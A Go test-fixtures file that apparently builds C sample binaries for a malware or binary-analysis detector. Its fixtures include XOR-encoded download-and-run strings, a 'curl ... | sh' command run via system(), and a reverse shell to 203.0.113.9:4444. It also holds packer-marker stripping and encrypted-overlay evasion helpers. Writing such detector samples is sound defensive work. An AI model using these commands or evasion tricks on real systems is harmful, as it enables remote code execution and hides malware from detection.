package fixtures

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// CompileC builds a small C program with the host compiler and returns its
// path. The test is skipped when no compiler is available. Programs are only
// ever analysed, never run.
func CompileC(t testing.TB, name, src string, flags ...string) string {
	t.Helper()
	cc, err := exec.LookPath("gcc")
	if err != nil {
		t.Skip("gcc not installed")
	}
	dir := t.TempDir()
	in := filepath.Join(dir, name+".c")
	if err := os.WriteFile(in, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	out := filepath.Join(dir, name)
	args := append(append([]string{}, flags...), "-o", out, in)
	if b, err := exec.Command(cc, args...).CombinedOutput(); err != nil { //nolint:gosec // fixed test tool
		t.Skipf("cannot build %s: %v\n%s", name, err, b)
	}
	return out
}

func cBytes(b []byte) string {
	parts := make([]string, len(b))
	for i, c := range b {
		parts[i] = fmt.Sprint(c)
	}
	return strings.Join(parts, ",")
}

// EncodedStaticStrings is a program that keeps a URL and a shell path in
// read-only data, encoded with the given single-byte operation.
func EncodedStaticStrings(t testing.TB, op string, key byte) string {
	t.Helper()
	enc := func(s string) []byte {
		b := append([]byte(s), 0)
		for i := range b {
			if op == "xor" {
				b[i] ^= key
			} else {
				b[i] += key
			}
		}
		return b
	}
	src := fmt.Sprintf(`#include <stdlib.h>
static const volatile unsigned char u[]={%s};
static const volatile unsigned char s[]={%s};
int main(void){ char b[96]; int i; for(i=0;i<(int)sizeof u;i++) b[i]=(char)(u[i] %s %d); (void)s; return b[0]=='h'; }
`, cBytes(enc("http://evil.example.net/payload")), cBytes(enc("/bin/sh -c id")), map[string]string{"xor": "^", "add": "-"}[op], key)
	return CompileC(t, "enc_"+op, src, "-O1")
}

// EncodedStackStrings builds the same text on the stack with constant stores,
// the way a compiler emits a local array initialiser.
func EncodedStackStrings(t testing.TB, key byte) string {
	t.Helper()
	enc := append([]byte("http://evil.example.net/payload"), 0)
	for i := range enc {
		enc[i] ^= key
	}
	src := fmt.Sprintf(`#include <stdlib.h>
int main(void){ unsigned char u[]={%s}; for(unsigned i=0;i<sizeof u;i++) u[i]^=%d; return system((char*)u); }
`, cBytes(enc), key)
	return CompileC(t, "enc_stack", src, "-O1")
}

// PlainStackString builds a command line on the stack at -O0.
func PlainStackString(t testing.TB) string {
	t.Helper()
	return CompileC(t, "stack_plain", `#include <stdlib.h>
int main(void){ volatile char c[]={'c','u','r','l',' ','-','s',' ','h','t','t','p',':','/','/','1','0','.','9','.','8','.','7','/','x','|','s','h',0}; return system((char*)c); }
`, "-O0")
}

// DynamicResolveOnly resolves a function by name at run time and carries no
// other notable text.
func DynamicResolveOnly(t testing.TB) string {
	t.Helper()
	return CompileC(t, "dlsym_only", `#define _GNU_SOURCE
#include <dlfcn.h>
int main(void){ int (*f)(void)=(int(*)(void))dlsym(RTLD_DEFAULT,"getpid"); return f?f():1; }
`, "-O1", "-ldl")
}

// CleanProgram is an ordinary program with ordinary text, the negative control.
func CleanProgram(t testing.TB) string {
	t.Helper()
	return CompileC(t, "clean", `#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char **argv){ char buf[128]; snprintf(buf, sizeof buf, "usage: %s <file>", argc>0?argv[0]:"tool"); puts(buf); return strlen(buf)>200 || getenv("HOME")==NULL; }
`, "-O1")
}

// WithEncryptedOverlay appends n bytes of keystream-encrypted data (SHA-256 in
// counter mode, so indistinguishable from random by entropy) to a program.
func WithEncryptedOverlay(t testing.TB, base string, n int) string {
	t.Helper()
	data, err := os.ReadFile(base)
	if err != nil {
		t.Fatal(err)
	}
	var stream bytes.Buffer
	for ctr := uint32(0); stream.Len() < n; ctr++ {
		var c [4]byte
		binary.LittleEndian.PutUint32(c[:], ctr)
		h := sha256.Sum256(append([]byte("fixture-key"), c[:]...))
		stream.Write(h[:])
	}
	out := filepath.Join(t.TempDir(), "overlay_"+filepath.Base(base))
	if err := os.WriteFile(out, append(data, stream.Bytes()[:n]...), 0o600); err != nil {
		t.Fatal(err)
	}
	return out
}

// StripUPXMarkers overwrites the UPX magic and banner text in a packed file,
// the way a malware author hides the packer's identity.
func StripUPXMarkers(t testing.TB, packed string) string {
	t.Helper()
	data, err := os.ReadFile(packed)
	if err != nil {
		t.Fatal(err)
	}
	for _, m := range []string{"UPX!", "UPX0", "UPX1", "UPX2", "This file is packed with the UPX executable packer", "$Id: UPX", "$Info: This file is packed with the UPX"} {
		data = bytes.ReplaceAll(data, []byte(m), bytes.Repeat([]byte{'~'}, len(m)))
	}
	out := filepath.Join(t.TempDir(), "stripped_"+filepath.Base(packed))
	if err := os.WriteFile(out, data, 0o600); err != nil {
		t.Fatal(err)
	}
	return out
}

// CompileWindows builds a small Windows program with MinGW-w64 and returns its
// path (skipping the test when the cross compiler is not installed). It is
// only ever analysed, never run.
func CompileWindows(t testing.TB, name, src string, flags ...string) string {
	t.Helper()
	cc, err := exec.LookPath("x86_64-w64-mingw32-gcc")
	if err != nil {
		t.Skip("x86_64-w64-mingw32-gcc not installed")
	}
	dir := t.TempDir()
	in := filepath.Join(dir, name+".c")
	if err := os.WriteFile(in, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	out := filepath.Join(dir, name+".exe")
	args := append(append([]string{}, flags...), "-o", out, in)
	if b, err := exec.Command(cc, args...).CombinedOutput(); err != nil { //nolint:gosec // fixed test tool
		t.Skipf("cannot build %s: %v\n%s", name, err, b)
	}
	return out
}

// WindowsImportsProgram calls CreateProcessA, VirtualAlloc, LoadLibraryA and
// GetProcAddress from main, so a call-site resolver has known answers.
func WindowsImportsProgram(t testing.TB) string {
	t.Helper()
	return CompileWindows(t, "winimports", `#include <windows.h>
static void launch(void){ STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi; CreateProcessA(NULL,"cmd.exe /c whoami",NULL,NULL,FALSE,0,NULL,NULL,&si,&pi); }
static void alloc(void){ void*p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE); if(p) VirtualFree(p,0,MEM_RELEASE); }
int main(int argc,char**argv){ if(argc>1) launch(); alloc(); HMODULE h=LoadLibraryA("user32.dll"); if(h) GetProcAddress(h,"MessageBoxA"); return 0; }
`, "-O1")
}

// LinuxNetworkProgram calls socket, connect and execl from main.
func LinuxNetworkProgram(t testing.TB) string {
	t.Helper()
	return CompileC(t, "linuxnet", `#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(void){ int s=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(4444); inet_pton(AF_INET,"203.0.113.9",&a.sin_addr); connect(s,(void*)&a,sizeof a); dup2(s,0); execl("/bin/sh","sh",(char*)0); return 0; }
`, "-O1")
}
